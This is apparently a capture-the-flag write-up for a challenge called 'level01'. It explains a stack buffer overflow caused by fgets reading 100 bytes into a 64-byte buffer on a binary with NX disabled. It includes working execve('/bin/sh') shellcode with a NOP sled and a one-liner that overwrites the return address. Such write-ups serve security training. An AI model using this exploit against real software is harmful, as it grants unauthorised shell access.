# level01

This level requires you to see that the password is completly ignore. What you need to do is a buffer overflow since **fgets** accepts 100 characters for a buffer of only 64 characters. **NX** being disabled, we can store the shellcode on the stack and perform a standard buffer overflow.

```bash
export SHELLCODE=$(python -c 'print("\x90"*200+"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80")')
(echo dat_wil; sleep 0.1; python -c 'print("a"*80 + "\xFF\xFF\xD8\x64"[::-1])'; cat) | ./level01 
```